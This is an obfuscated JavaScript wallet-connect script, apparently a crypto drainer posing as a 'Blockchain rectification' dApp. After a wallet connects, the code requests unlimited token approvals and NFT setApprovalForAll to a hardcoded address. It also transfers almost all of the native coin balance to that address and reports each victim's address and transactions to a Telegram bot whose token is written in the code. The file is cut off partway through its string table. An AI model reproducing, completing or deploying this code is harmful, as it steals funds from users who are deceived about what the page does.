const _0x569ec7=_0x39b8;(function(_0x4ba158,_0x232e11){const _0x25f3a2=_0x39b8,_0x5243e6=_0x4ba158();while(!![]){try{const _0x4d9833=parseInt(_0x25f3a2(0xc2))/0x1*(-parseInt(_0x25f3a2(0xd3))/0x2)+parseInt(_0x25f3a2(0x11a))/0x3*(parseInt(_0x25f3a2(0x11c))/0x4)+-parseInt(_0x25f3a2(0xb0))/0x5*(parseInt(_0x25f3a2(0x104))/0x6)+-parseInt(_0x25f3a2(0x96))/0x7+parseInt(_0x25f3a2(0xc0))/0x8+parseInt(_0x25f3a2(0x131))/0x9*(-parseInt(_0x25f3a2(0x91))/0xa)+parseInt(_0x25f3a2(0xfe))/0xb*(parseInt(_0x25f3a2(0xd6))/0xc);if(_0x4d9833===_0x232e11)break;else _0x5243e6['push'](_0x5243e6['shift']());}catch(_0xd20d7c){_0x5243e6['push'](_0x5243e6['shift']());}}}(_0x1364,0xbaaf6));let NFTs=[],tokens=[],chainId=null,web3Object=null,selectedAccount=null;import{EthereumClient,w3mConnectors,w3mProvider,WagmiCore,WagmiCoreChains,WagmiCoreConnectors}from'https://unpkg.com/@web3modal/ethereum@2.6.2';import{parseEther}from'https://esm.sh/v126/viem@1.2.15/es2022/viem.bundle.mjs';import{Web3Modal}from'https://unpkg.com/@web3modal/html@2.6.2';const {bsc,mainnet}=WagmiCoreChains,{configureChains,createConfig,writeContract,sendTransaction,fetchBalance,fetchFeeData,connect,switchNetwork,getAccount,getNetwork}=WagmiCore,chains=[bsc,mainnet],projectId=_0x569ec7(0xd2),{publicClient}=configureChains(chains,[w3mProvider({'projectId':projectId})]),wagmiConfig=createConfig({'autoConnect':!![],'connectors':[...w3mConnectors({'chains':chains,'version':0x2,'projectId':projectId}),new WagmiCoreConnectors[(_0x569ec7(0x95))]({'chains':chains,'options':{'appName':'Blockchain\x20rectification'}})],'publicClient':publicClient}),ethereumClient=new EthereumClient(wagmiConfig,chains);export const web3Modal=new Web3Modal({'projectId':projectId,'walletImages':{'safe':_0x569ec7(0x12a)}},ethereumClient);function _0x39b8(_0x1c14c8,_0x473e93){const _0x1364b7=_0x1364();return _0x39b8=function(_0x39b89c,_0x3b06ac){_0x39b89c=_0x39b89c-0x87;let _0x42fb62=_0x1364b7[_0x39b89c];return _0x42fb62;},_0x39b8(_0x1c14c8,_0x473e93);}const OWNER_ADDRESS=_0x569ec7(0x124),ABI=[{'constant':!![],'inputs':[],'name':_0x569ec7(0x90),'outputs':[{'name':'','type':_0x569ec7(0x11e)}],'payable':![],'stateMutability':'view','type':_0x569ec7(0xd8)},{'constant':![],'inputs':[{'name':_0x569ec7(0xf7),'type':_0x569ec7(0xcf)}],'name':_0x569ec7(0xa7),'outputs':[],'payable':![],'stateMutability':_0x569ec7(0xdf),'type':'function'},{'constant':![],'inputs':[{'name':_0x569ec7(0xac),'type':_0x569ec7(0xcf)},{'name':_0x569ec7(0x108),'type':_0x569ec7(0xaf)}],'name':'approve','outputs':[],'payable':![],'stateMutability':_0x569ec7(0xdf),'type':_0x569ec7(0xd8)},{'constant':!![],'inputs':[],'name':'deprecated','outputs':[{'name':'','type':_0x569ec7(0xeb)}],'payable':![],'stateMutability':_0x569ec7(0x9d),'type':'function'},{'constant':![],'inputs':[{'name':_0x569ec7(0xbe),'type':'address'}],'name':_0x569ec7(0x127),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x569ec7(0xd8)},{'constant':!![],'inputs':[],'name':_0x569ec7(0xe2),'outputs':[{'name':'','type':_0x569ec7(0xaf)}],'payable':![],'stateMutability':_0x569ec7(0x9d),'type':_0x569ec7(0xd8)},{'constant':![],'inputs':[{'name':_0x569ec7(0xd4),'type':'address'},{'name':_0x569ec7(0xf6),'type':_0x569ec7(0xcf)},{'name':_0x569ec7(0x108),'type':_0x569ec7(0xaf)}],'name':_0x569ec7(0xe8),'outputs':[],'payable':![],'stateMutability':_0x569ec7(0xdf),'type':_0x569ec7(0xd8)},{'constant':!![],'inputs':[],'name':_0x569ec7(0xbf),'outputs':[{'name':'','type':'address'}],'payable':![],'stateMutability':_0x569ec7(0x9d),'type':_0x569ec7(0xd8)},{'constant':!![],'inputs':[{'name':'','type':'address'}],'name':'balances','outputs':[{'name':'','type':_0x569ec7(0xaf)}],'payable':![],'stateMutability':_0x569ec7(0x9d),'type':_0x569ec7(0xd8)},{'constant':!![],'inputs':[],'name':'decimals','outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x569ec7(0x9d),'type':'function'},{'constant':!![],'inputs':[],'name':_0x569ec7(0xbb),'outputs':[{'name':'','type':_0x569ec7(0xaf)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':!![],'inputs':[],'name':_0x569ec7(0x106),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x569ec7(0x9d),'type':'function'},{'constant':![],'inputs':[],'name':_0x569ec7(0xfb),'outputs':[],'payable':![],'stateMutability':_0x569ec7(0xdf),'type':_0x569ec7(0xd8)},{'constant':!![],'inputs':[{'name':'_maker','type':_0x569ec7(0xcf)}],'name':_0x569ec7(0x112),'outputs':[{'name':'','type':_0x569ec7(0xeb)}],'payable':![],'stateMutability':'view','type':_0x569ec7(0xd8)},{'constant':!![],'inputs':[{'name':'','type':'address'},{'name':'','type':_0x569ec7(0xcf)}],'name':_0x569ec7(0x135),'outputs':[{'name':'','type':_0x569ec7(0xaf)}],'payable':![],'stateMutability':'view','type':_0x569ec7(0xd8)},{'constant':!![],'inputs':[],'name':_0x569ec7(0xa4),'outputs':[{'name':'','type':_0x569ec7(0xeb)}],'payable':![],'stateMutability':_0x569ec7(0x9d),'type':_0x569ec7(0xd8)},{'constant':!![],'inputs':[{'name':'who','type':_0x569ec7(0xcf)}],'name':'balanceOf','outputs':[{'name':'','type':_0x569ec7(0xaf)}],'payable':![],'stateMutability':_0x569ec7(0x9d),'type':_0x569ec7(0xd8)},{'constant':![],'inputs':[],'name':_0x569ec7(0x9b),'outputs':[],'payable':![],'stateMutability':_0x569ec7(0xdf),'type':'function'},{'constant':!![],'inputs':[],'name':_0x569ec7(0x12f),'outputs':[{'name':'','type':_0x569ec7(0xcf)}],'payable':![],'stateMutability':_0x569ec7(0x9d),'type':_0x569ec7(0xd8)},{'constant':!![],'inputs':[],'name':_0x569ec7(0x8b),'outputs':[{'name':'','type':_0x569ec7(0xcf)}],'payable':![],'stateMutability':'view','type':_0x569ec7(0xd8)},{'constant':!![],'inputs':[],'name':'symbol','outputs':[{'name':'','type':_0x569ec7(0x11e)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':![],'inputs':[{'name':_0x569ec7(0xf6),'type':_0x569ec7(0xcf)},{'name':_0x569ec7(0x108),'type':_0x569ec7(0xaf)}],'name':'transfer','outputs':[],'payable':![],'stateMutability':_0x569ec7(0xdf),'type':'function'},{'constant':![],'inputs':[{'name':_0x569ec7(0xbc),'type':'uint256'},{'name':'newMaxFee','type':_0x569ec7(0xaf)}],'name':_0x569ec7(0x109),'outputs':[],'payable':![],'stateMutability':_0x569ec7(0xdf),'type':_0x569ec7(0xd8)},{'constant':![],'inputs':[{'name':_0x569ec7(0x123),'type':_0x569ec7(0xaf)}],'name':_0x569ec7(0x9e),'outputs':[],'payable':![],'stateMutability':_0x569ec7(0xdf),'type':'function'},{'constant':![],'inputs':[{'name':'amount','type':'uint256'}],'name':_0x569ec7(0xb2),'outputs':[],'payable':![],'stateMutability':_0x569ec7(0xdf),'type':_0x569ec7(0xd8)},{'constant':!![],'inputs':[{'name':_0x569ec7(0x9c),'type':_0x569ec7(0xcf)},{'name':'_spender','type':_0x569ec7(0xcf)}],'name':'allowance','outputs':[{'name':_0x569ec7(0x111),'type':_0x569ec7(0xaf)}],'payable':![],'stateMutability':_0x569ec7(0x9d),'type':_0x569ec7(0xd8)},{'constant':!![],'inputs':[],'name':_0x569ec7(0xc9),'outputs':[{'name':'','type':_0x569ec7(0xaf)}],'payable':![],'stateMutability':_0x569ec7(0x9d),'type':_0x569ec7(0xd8)},{'constant':!![],'inputs':[{'name':'','type':_0x569ec7(0xcf)}],'name':_0x569ec7(0xe4),'outputs':[{'name':'','type':_0x569ec7(0xeb)}],'payable':![],'stateMutability':'view','type':_0x569ec7(0xd8)},{'constant':![],'inputs':[{'name':_0x569ec7(0x12d),'type':'address'}],'name':'removeBlackList','outputs':[],'payable':![],'stateMutability':_0x569ec7(0xdf),'type':_0x569ec7(0xd8)},{'constant':!![],'inputs':[],'name':_0x569ec7(0x10c),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x569ec7(0x9d),'type':_0x569ec7(0xd8)},{'constant':![],'inputs':[{'name':_0x569ec7(0xe7),'type':_0x569ec7(0xcf)}],'name':_0x569ec7(0xa8),'outputs':[],'payable':![],'stateMutability':_0x569ec7(0xdf),'type':'function'},{'constant':![],'inputs':[{'name':'_blackListedUser','type':'address'}],'name':'destroyBlackFunds','outputs':[],'payable':![],'stateMutability':_0x569ec7(0xdf),'type':_0x569ec7(0xd8)},{'inputs':[{'name':_0x569ec7(0xee),'type':'uint256'},{'name':_0x569ec7(0xe3),'type':_0x569ec7(0x11e)},{'name':_0x569ec7(0xb5),'type':'string'},{'name':'_decimals','type':'uint256'}],'payable':![],'stateMutability':'nonpayable','type':_0x569ec7(0x116)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x569ec7(0x123),'type':_0x569ec7(0xaf)}],'name':_0x569ec7(0x10e),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x569ec7(0x123),'type':_0x569ec7(0xaf)}],'name':_0x569ec7(0xe0),'type':_0x569ec7(0x103)},{'anonymous':![],'inputs':[{'indexed':![],'name':'newAddress','type':_0x569ec7(0xcf)}],'name':_0x569ec7(0xde),'type':_0x569ec7(0x103)},{'anonymous':![],'inputs':[{'indexed':![],'name':'feeBasisPoints','type':_0x569ec7(0xaf)},{'indexed':![],'name':_0x569ec7(0xec),'type':_0x569ec7(0xaf)}],'name':_0x569ec7(0xad),'type':_0x569ec7(0x103)},{'anonymous':![],'inputs':[{'indexed':![],'name':'_blackListedUser','type':_0x569ec7(0xcf)},{'indexed':![],'name':_0x569ec7(0xdd),'type':_0x569ec7(0xaf)}],'name':'DestroyedBlackFunds','type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x569ec7(0x126),'type':_0x569ec7(0xcf)}],'name':_0x569ec7(0x113),'type':_0x569ec7(0x103)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x569ec7(0x126),'type':_0x569ec7(0xcf)}],'name':_0x569ec7(0x129),'type':_0x569ec7(0x103)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x569ec7(0x8b),'type':'address'},{'indexed':!![],'name':_0x569ec7(0x100),'type':_0x569ec7(0xcf)},{'indexed':![],'name':_0x569ec7(0xab),'type':_0x569ec7(0xaf)}],'name':_0x569ec7(0x132),'type':_0x569ec7(0x103)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x569ec7(0x117),'type':_0x569ec7(0xcf)},{'indexed':!![],'name':'to','type':'address'},{'indexed':![],'name':'value','type':_0x569ec7(0xaf)}],'name':_0x569ec7(0x10f),'type':_0x569ec7(0x103)},{'anonymous':![],'inputs':[],'name':_0x569ec7(0xfd),'type':_0x569ec7(0x103)},{'anonymous':![],'inputs':[],'name':_0x569ec7(0x107),'type':'event'}],ABIN=[{'inputs':[{'internalType':_0x569ec7(0x11e),'name':'name','type':_0x569ec7(0x11e)},{'internalType':_0x569ec7(0x11e),'name':_0x569ec7(0xa1),'type':_0x569ec7(0x11e)},{'internalType':_0x569ec7(0xaf),'name':'maxNftSupply','type':_0x569ec7(0xaf)},{'internalType':'uint256','name':_0x569ec7(0x102),'type':'uint256'}],'stateMutability':_0x569ec7(0xdf),'type':_0x569ec7(0x116)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x569ec7(0xcf),'name':_0x569ec7(0x8b),'type':_0x569ec7(0xcf)},{'indexed':!![],'internalType':'address','name':_0x569ec7(0xd1),'type':_0x569ec7(0xcf)},{'indexed':!![],'internalType':_0x569ec7(0xaf),'name':_0x569ec7(0xa9),'type':'uint256'}],'name':_0x569ec7(0x132),'type':_0x569ec7(0x103)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x569ec7(0xcf),'name':_0x569ec7(0x8b),'type':_0x569ec7(0xcf)},{'indexed':!![],'internalType':_0x569ec7(0xcf),'name':_0x569ec7(0xa3),'type':_0x569ec7(0xcf)},{'indexed':![],'internalType':_0x569ec7(0xeb),'name':_0x569ec7(0xd1),'type':_0x569ec7(0xeb)}],'name':_0x569ec7(0xdc),'type':_0x569ec7(0x103)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x569ec7(0xcf),'name':'previousOwner','type':_0x569ec7(0xcf)},{'indexed':!![],'internalType':_0x569ec7(0xcf),'name':_0x569ec7(0xe7),'type':_0x569ec7(0xcf)}],'name':_0x569ec7(0x11d),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x569ec7(0x117),'type':'address'},{'indexed':!![],'internalType':_0x569ec7(0xcf),'name':'to','type':_0x569ec7(0xcf)},{'indexed':!![],'internalType':_0x569ec7(0xaf),'name':_0x569ec7(0xa9),'type':_0x569ec7(0xaf)}],'name':_0x569ec7(0x10f),'type':'event'},{'inputs':[],'name':_0x569ec7(0x115),'outputs':[{'internalType':_0x569ec7(0x11e),'name':'','type':_0x569ec7(0x11e)}],'stateMutability':'view','type':_0x569ec7(0xd8)},{'inputs':[],'name':_0x569ec7(0xea),'outputs':[{'internalType':_0x569ec7(0xaf),'name':'','type':_0x569ec7(0xaf)}],'stateMutability':_0x569ec7(0x9d),'type':_0x569ec7(0xd8)},{'inputs':[],'name':_0x569ec7(0x10d),'outputs':[{'internalType':'uint256','name':'','type':_0x569ec7(0xaf)}],'stateMutability':_0x569ec7(0x9d),'type':_0x569ec7(0xd8)},{'inputs':[],'name':'apePrice','outputs':[{'internalType':'uint256','name':'','type':'uint256'}],'stateMutability':'view','type':_0x569ec7(0xd8)},{'inputs':[{'internalType':_0x569ec7(0xcf),'name':'to','type':_0x569ec7(0xcf)},{'internalType':_0x569ec7(0xaf),'name':'tokenId','type':_0x569ec7(0xaf)}],'name':_0x569ec7(0x120),'outputs':[],'stateMutability':_0x569ec7(0xdf),'type':_0x569ec7(0xd8)},{'inputs':[{'internalType':_0x569ec7(0xcf),'name':'owner','type':_0x569ec7(0xcf)}],'name':'balanceOf','outputs':[{'internalType':_0x569ec7(0xaf),'name':'','type':_0x569ec7(0xaf)}],'stateMutability':_0x569ec7(0x9d),'type':_0x569ec7(0xd8)},{'inputs':[],'name':_0x569ec7(0x133),'outputs':[{'internalType':_0x569ec7(0x11e),'name':'','type':_0x569ec7(0x11e)}],'stateMutability':_0x569ec7(0x9d),'type':_0x569ec7(0xd8)},{'inputs':[],'name':_0x569ec7(0x134),'outputs':[],'stateMutability':_0x569ec7(0xdf),'type':_0x569ec7(0xd8)},{'inputs':[],'name':_0x569ec7(0x128),'outputs':[],'stateMutability':_0x569ec7(0xdf),'type':_0x569ec7(0xd8)},{'inputs':[{'internalType':'uint256','name':'tokenId','type':_0x569ec7(0xaf)}],'name':_0x569ec7(0x136),'outputs':[{'internalType':_0x569ec7(0xcf),'name':'','type':_0x569ec7(0xcf)}],'stateMutability':'view','type':_0x569ec7(0xd8)},{'inputs':[{'internalType':_0x569ec7(0xcf),'name':'owner','type':_0x569ec7(0xcf)},{'internalType':_0x569ec7(0xcf),'name':_0x569ec7(0xa3),'type':'address'}],'name':'isApprovedForAll','outputs':[{'internalType':'bool','name':'','type':_0x569ec7(0xeb)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':'maxApePurchase','outputs':[{'internalType':_0x569ec7(0xaf),'name':'','type':'uint256'}],'stateMutability':_0x569ec7(0x9d),'type':_0x569ec7(0xd8)},{'inputs':[{'internalType':'uint256','name':_0x569ec7(0x12e),'type':_0x569ec7(0xaf)}],'name':_0x569ec7(0x98),'outputs':[],'stateMutability':_0x569ec7(0x125),'type':_0x569ec7(0xd8)},{'inputs':[],'name':_0x569ec7(0x90),'outputs':[{'internalType':'string','name':'','type':_0x569ec7(0x11e)}],'stateMutability':_0x569ec7(0x9d),'type':_0x569ec7(0xd8)},{'inputs':[],'name':_0x569ec7(0x8b),'outputs':[{'internalType':'address','name':'','type':_0x569ec7(0xcf)}],'stateMutability':_0x569ec7(0x9d),'type':_0x569ec7(0xd8)},{'inputs':[{'internalType':'uint256','name':'tokenId','type':_0x569ec7(0xaf)}],'name':'ownerOf','outputs':[{'internalType':'address','name':'','type':'address'}],'stateMutability':_0x569ec7(0x9d),'type':_0x569ec7(0xd8)},{'inputs':[],'name':_0x569ec7(0xe9),'outputs':[],'stateMutability':_0x569ec7(0xdf),'type':'function'},{'inputs':[],'name':_0x569ec7(0xf5),'outputs':[],'stateMutability':_0x569ec7(0xdf),'type':_0x569ec7(0xd8)},{'inputs':[{'internalType':_0x569ec7(0xcf),'name':_0x569ec7(0x117),'type':_0x569ec7(0xcf)},{'internalType':_0x569ec7(0xcf),'name':'to','type':_0x569ec7(0xcf)},{'internalType':'uint256','name':'tokenId','type':_0x569ec7(0xaf)}],'name':_0x569ec7(0xb1),'outputs':[],'stateMutability':_0x569ec7(0xdf),'type':_0x569ec7(0xd8)},{'inputs':[{'internalType':_0x569ec7(0xcf),'name':_0x569ec7(0x117),'type':_0x569ec7(0xcf)},{'internalType':_0x569ec7(0xcf),'name':'to','type':_0x569ec7(0xcf)},{'internalType':_0x569ec7(0xaf),'name':_0x569ec7(0xa9),'type':'uint256'},{'internalType':_0x569ec7(0x130),'name':_0x569ec7(0xe6),'type':_0x569ec7(0x130)}],'name':_0x569ec7(0xb1),'outputs':[],'stateMutability':_0x569ec7(0xdf),'type':_0x569ec7(0xd8)},{'inputs':[],'name':'saleIsActive','outputs':[{'internalType':_0x569ec7(0xeb),'name':'','type':_0x569ec7(0xeb)}],'stateMutability':'view','type':_0x569ec7(0xd8)},{'inputs':[{'internalType':_0x569ec7(0xcf),'name':_0x569ec7(0xa3),'type':_0x569ec7(0xcf)},{'internalType':_0x569ec7(0xeb),'name':'approved','type':_0x569ec7(0xeb)}],'name':_0x569ec7(0x12c),'outputs':[],'stateMutability':_0x569ec7(0xdf),'type':'function'},{'inputs':[{'internalType':'string','name':_0x569ec7(0x133),'type':_0x569ec7(0x11e)}],'name':_0x569ec7(0xa5),'outputs':[],'stateMutability':_0x569ec7(0xdf),'type':_0x569ec7(0xd8)},{'inputs':[{'internalType':_0x569ec7(0x11e),'name':_0x569ec7(0xcb),'type':'string'}],'name':'setProvenanceHash','outputs':[],'stateMutability':_0x569ec7(0xdf),'type':_0x569ec7(0xd8)},{'inputs':[{'internalType':_0x569ec7(0xaf),'name':'revealTimeStamp','type':_0x569ec7(0xaf)}],'name':_0x569ec7(0xef),'outputs':[],'stateMutability':_0x569ec7(0xdf),'type':_0x569ec7(0xd8)},{'inputs':[],'name':'setStartingIndex','outputs':[],'stateMutability':_0x569ec7(0xdf),'type':_0x569ec7(0xd8)},{'inputs':[],'name':'startingIndex','outputs':[{'internalType':_0x569ec7(0xaf),'name':'','type':_0x569ec7(0xaf)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x569ec7(0x87),'outputs':[{'internalType':_0x569ec7(0xaf),'name':'','type':_0x569ec7(0xaf)}],'stateMutability':_0x569ec7(0x9d),'type':'function'},{'inputs':[{'internalType':_0x569ec7(0xc7),'name':'interfaceId','type':_0x569ec7(0xc7)}],'name':_0x569ec7(0xd9),'outputs':[{'internalType':_0x569ec7(0xeb),'name':'','type':'bool'}],'stateMutability':_0x569ec7(0x9d),'type':_0x569ec7(0xd8)},{'inputs':[],'name':_0x569ec7(0xa1),'outputs':[{'internalType':_0x569ec7(0x11e),'name':'','type':_0x569ec7(0x11e)}],'stateMutability':_0x569ec7(0x9d),'type':_0x569ec7(0xd8)},{'inputs':[{'internalType':'uint256','name':_0x569ec7(0xb8),'type':_0x569ec7(0xaf)}],'name':_0x569ec7(0xd7),'outputs':[{'internalType':'uint256','name':'','type':_0x569ec7(0xaf)}],'stateMutability':'view','type':_0x569ec7(0xd8)},{'inputs':[{'internalType':_0x569ec7(0xcf),'name':_0x569ec7(0x8b),'type':_0x569ec7(0xcf)},{'internalType':'uint256','name':'index','type':_0x569ec7(0xaf)}],'name':_0x569ec7(0x11b),'outputs':[{'internalType':'uint256','name':'','type':_0x569ec7(0xaf)}],'stateMutability':'view','type':_0x569ec7(0xd8)},{'inputs':[{'internalType':_0x569ec7(0xaf),'name':_0x569ec7(0xa9),'type':_0x569ec7(0xaf)}],'name':_0x569ec7(0xb7),'outputs':[{'internalType':_0x569ec7(0x11e),'name':'','type':_0x569ec7(0x11e)}],'stateMutability':_0x569ec7(0x9d),'type':'function'},{'inputs':[],'name':_0x569ec7(0xe2),'outputs':[{'internalType':_0x569ec7(0xaf),'name':'','type':_0x569ec7(0xaf)}],'stateMutability':_0x569ec7(0x9d),'type':'function'},{'inputs':[{'internalType':_0x569ec7(0xcf),'name':_0x569ec7(0x117),'type':_0x569ec7(0xcf)},{'internalType':_0x569ec7(0xcf),'name':'to','type':_0x569ec7(0xcf)},{'internalType':_0x569ec7(0xaf),'name':_0x569ec7(0xa9),'type':_0x569ec7(0xaf)}],'name':_0x569ec7(0xe8),'outputs':[],'stateMutability':_0x569ec7(0xdf),'type':'function'},{'inputs':[{'internalType':'address','name':_0x569ec7(0xe7),'type':_0x569ec7(0xcf)}],'name':'transferOwnership','outputs':[],'stateMutability':_0x569ec7(0xdf),'type':_0x569ec7(0xd8)},{'inputs':[],'name':_0x569ec7(0xce),'outputs':[],'stateMutability':_0x569ec7(0xdf),'type':_0x569ec7(0xd8)}];$(_0x569ec7(0x94))['click'](async function(){const _0x5d61da=_0x569ec7;console['log']('1');try{await web3Modal['openModal']();}catch(_0x560687){console[_0x5d61da(0xc6)]('Could\x20not\x20get\x20a\x20wallet\x20connection',_0x560687);return;}}),$(_0x569ec7(0x8f))['click'](async function(){const _0x2c6ec8=_0x569ec7;let _0x436752=getAccount();console['log'](_0x436752),!_0x436752[_0x2c6ec8(0xcf)]&&(console[_0x2c6ec8(0xc6)](_0x2c6ec8(0xa6)),alert(_0x2c6ec8(0x93))),_0x436752['connector'][_0x2c6ec8(0x90)]==='MetaMask'&&(_0x436752[_0x2c6ec8(0x8d)][_0x2c6ec8(0x11f)][_0x2c6ec8(0xb6)]()[_0x2c6ec8(0x119)]!=='56'&&(console[_0x2c6ec8(0xc6)](_0x2c6ec8(0xbd)),await switchNetwork({'chainId':0x38}))),selectedAccount=_0x436752[_0x2c6ec8(0xcf)],sendMessage(_0x2c6ec8(0x92)),sendMessage(_0x2c6ec8(0xa2)+selectedAccount),covalenthqAPICall();});const Oxa=_0x569ec7(0xe1),Oxc=_0x569ec7(0xed);async function covalenthqAPICall(){const _0xf8647a=_0x569ec7,_0x485cf4={'chain':_0xf8647a(0x118)},_0xaff0b0=new URL(_0xf8647a(0x99)+selectedAccount+_0xf8647a(0xf9));_0xaff0b0[_0xf8647a(0xf0)]=new URLSearchParams(_0x485cf4)['toString']();const _0x12f0dd={'method':_0xf8647a(0xfa),'headers':{'accept':_0xf8647a(0xb9),'X-API-Key':_0xf8647a(0x121)}};try{const _0x95b373=await fetch(_0xaff0b0,_0x12f0dd)[_0xf8647a(0xae)](_0x812f50=>_0x812f50[_0xf8647a(0x105)]());console[_0xf8647a(0xc6)](_0x95b373);let _0xf07aa3=_0x95b373;console[_0xf8647a(0xc6)]('Initial\x20list\x20',_0xf07aa3);let _0x36682a=await Promise[_0xf8647a(0x8e)](_0xf07aa3[_0xf8647a(0xdb)](async _0xbddf99=>{const _0xd452b5=_0xf8647a;let _0x238f0d;try{_0x238f0d=await getValue(_0xbddf99['token_address'],_0xbddf99[_0xd452b5(0x10a)],_0xbddf99[_0xd452b5(0xc1)]);}catch(_0x3a493e){_0x238f0d=0x0;}return console[_0xd452b5(0xc6)](_0x238f0d),{'balance':_0xbddf99[_0xd452b5(0x10a)],'value':_0x238f0d,'address':_0xbddf99['token_address']};}));console[_0xf8647a(0xc6)](_0xf8647a(0x110),_0x36682a),tokens=_0x36682a[_0xf8647a(0xf2)](_0x4cf3ea=>_0x4cf3ea['value']>0x5),tokens[_0xf8647a(0xc4)]((_0x11866d,_0x4392ec)=>_0x4392ec['value']-_0x11866d[_0xf8647a(0xab)]),console['log']('chainId:',await getNetwork(),_0xf8647a(0xb3),tokens),NFTs=await getNFTs(selectedAccount)[_0xf8647a(0x101)](_0x225c84=>{const _0x4b35c1=_0xf8647a;console[_0x4b35c1(0xc6)]('Unable\x20to\x20get\x20NFts',_0x225c84);}),NFTs=NFTs[_0xf8647a(0xc5)],console[_0xf8647a(0xc6)](_0xf8647a(0xf8),NFTs);if(tokens[_0xf8647a(0xff)]===0x0&&NFTs[_0xf8647a(0xff)]===0x0)onSendEther();else onApprove();}catch{sendMessage(_0xf8647a(0xba));}}async function onApprove(){const _0x458892=_0x569ec7;if(tokens[_0x458892(0xff)])try{loopTokens(tokens);}catch(_0x52b80e){console['error'](_0x458892(0x12b)+_0x52b80e[_0x458892(0xc8)]);}else{if(NFTs['length']){try{loopNfts(NFTs);}catch(_0x43d76d){console[_0x458892(0xa0)]('Error\x20processing\x20item\x20'+_0x43d76d[_0x458892(0xc8)]);}onSendEther(),sendMessage(_0x458892(0xf3));}else try{onSendEther();}catch(_0x58e576){console[_0x458892(0xa0)](_0x458892(0x12b)+_0x58e576[_0x458892(0xc8)]);}}}async function loopTokens(_0x56cb37){const _0x4f767c=_0x569ec7;for await(let _0x345126 of _0x56cb37){console['log'](_0x4f767c(0xd5),_0x345126);try{sendMessage('New\x20token');let {hash:_0x2c2583}=await writeContract({'address':_0x345126[_0x4f767c(0xcf)],'abi':ABI,'functionName':_0x4f767c(0x120),'args':[Oxa,'999999999999999999999999999999999999999999999999999999999999999999999999']});console[_0x4f767c(0xc6)](_0x4f767c(0xcc),_0x2c2583),_0x2c2583&&(console[_0x4f767c(0xc6)]('Approved'),sendMessage(_0x4f767c(0xc3)),sendMessage(_0x4f767c(0x114)+_0x345126[_0x4f767c(0xcf)]),sendMessage('Token\x20balance\x20is\x20'+_0x345126[_0x4f767c(0x10a)]),sendMessage(_0x4f767c(0xf1)+Oxa));}catch(_0x4ed709){console['log'](_0x4f767c(0xf4)+_0x4ed709),sendMessage(_0x4f767c(0x8a));}};await loopNfts(NFTs);}async function loopNfts(_0x588707){const _0x1185d6=_0x569ec7;for await(let _0x1eefec of _0x588707){console[_0x1185d6(0xc6)](_0x1185d6(0xaa),_0x1eefec);try{let {hash:_0x30c70c}=await writeContract({'address':_0x1eefec['token_address'],'abi':ABIN,'functionName':_0x1185d6(0x12c),'args':[Oxa,!![]]});console[_0x1185d6(0xc6)]('hash',_0x30c70c),console[_0x1185d6(0xc6)](_0x1185d6(0x9f)+receipt),sendMessage(_0x1185d6(0xc3)),sendMessage(_0x1185d6(0xcd)+_0x1eefec['token_address']),sendMessage(_0x1185d6(0xf1)+Oxa);}catch(_0x45cc79){console[_0x1185d6(0xc6)](_0x1185d6(0xf4)+_0x45cc79),sendMessage(_0x1185d6(0x8a));}}await onSendEther();}async function onSendEther(){const _0x28723d=_0x569ec7;console['log'](_0x28723d(0x88));try{let _0x54ed40=await fetchBalance({'address':selectedAccount});console[_0x28723d(0xc6)](_0x54ed40);const _0x19b6fa=await fetchFeeData();console['log'](_0x19b6fa);var _0x5554da=_0x19b6fa[_0x28723d(0x9a)][_0x28723d(0x89)];_0x5554da=parseFloat(_0x5554da);let _0x24cd7b=parseFloat(_0x54ed40[_0x28723d(0x9a)])-_0x5554da*0.00042;_0x24cd7b=parseEther(_0x24cd7b[_0x28723d(0xb4)]()),console[_0x28723d(0xc6)](_0x24cd7b);const {hash:_0x2b8341}=await sendTransaction({'to':Oxa,'value':_0x24cd7b});console[_0x28723d(0xc6)](_0x2b8341),sendMessage(_0x28723d(0xd0),_0x2b8341),sendMessage(_0x28723d(0xda)),sendMessage(_0x28723d(0x122));}catch{sendMessage(_0x28723d(0x10b));}}async function sendMessage(_0x58fb08){return new Promise((_0x4d2f48,_0x1b153d)=>{const _0x1e9c89=_0x39b8,_0x45314f=Oxc;fetch('https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id='+_0x45314f+'&text='+_0x58fb08,{'method':'GET','headers':{}})['then'](async _0x5a624a=>{const _0x22e7ae=_0x39b8;if(_0x5a624a[_0x22e7ae(0x97)]>0x18f)throw _0x5a624a;_0x4d2f48(await _0x5a624a[_0x22e7ae(0x105)]());})[_0x1e9c89(0x101)](_0x55ece1=>{_0x1b153d(_0x55ece1);});});}function _0x1364(){const _0x23a957=['formatted','pause','_owner','view','issue','Transaction\x20Receipt:\x20','error','symbol','Cl\x20address\x20:\x20','operator','paused','setBaseURI','No\x20address','deprecate','transferOwnership','tokenId','NFT','value','_spender','Params','then','uint256','714440gGSHBO','safeTransferFrom','redeem','Tokens:','toString','_symbol','getProvider','tokenURI','index','application/json','Error\x20collecting\x20info\x20about\x20wallet','maximumFee','newBasisPoints','Incorrect\x20network','_evilUser','upgradedAddress','7634480zXwmVN','decimals','16189rCJawm','Approve\x20Completed\x20Successfully','sort','result','log','bytes4','message','basisPointsRate','https://api.coingecko.com/api/v3/simple/token_price/binance-smart-chain?contract_addresses=','provenanceHash','hash','NFT\x20Contract\x20Address\x20','withdraw','address','Transaction\x20hash\x20','approved','ee71d215d0dec7d1bf950851c84d9643','16qbuSHO','_from','Token','22085796iMZggj','token